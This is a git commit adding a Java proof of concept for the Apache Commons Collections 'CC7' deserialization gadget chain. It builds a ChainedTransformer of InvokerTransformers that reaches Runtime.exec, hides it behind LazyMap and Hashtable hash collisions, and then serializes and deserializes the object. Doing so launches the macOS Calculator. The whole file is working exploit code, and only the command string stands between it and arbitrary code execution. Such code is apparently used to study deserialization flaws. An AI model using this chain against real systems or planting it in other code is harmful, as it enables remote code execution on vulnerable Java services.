93a0c14e5947f0749bac767d673174dd0a1e69ec
BabyTeam1024 <74447452+BabyTeam1024@users.noreply.github.com>
2021-02-28 17:36:14 +0800

    Create cc7.java

---
+++ cc7.java
@@ -0,0 +1,62 @@
+package com.reflect;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import ysoserial.payloads.util.Reflections;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class cc7test {
+    public static byte[] serialize(final Object obj) throws Exception {
+        ByteArrayOutputStream btout = new ByteArrayOutputStream();
+        ObjectOutputStream objOut = new ObjectOutputStream(btout);
+        objOut.writeObject(obj);
+        return btout.toByteArray();
+    }
+    public static Object unserialize(final byte[] serialized) throws Exception {
+        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
+        ObjectInputStream objIn = new ObjectInputStream(btin);
+        return objIn.readObject();
+    }
+    
+    public static void main(String[] args) throws Exception{
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
+        };
+        Transformer transformerChain = new ChainedTransformer(new Transformer[] {});
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+        lazyMap1.put("yy", 1);
+        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+        lazyMap2.put("zZ", 1);
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 1);
+        Class tr = transformerChain.getClass();
+        Field field = tr.getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        final Object value = transformers;
+        final Object chain = transformerChain;
+        field.set(chain,value);
+        lazyMap2.remove("yy");
+        byte[] serializeData=serialize(hashtable);
+        unserialize(serializeData);
+    }
+}
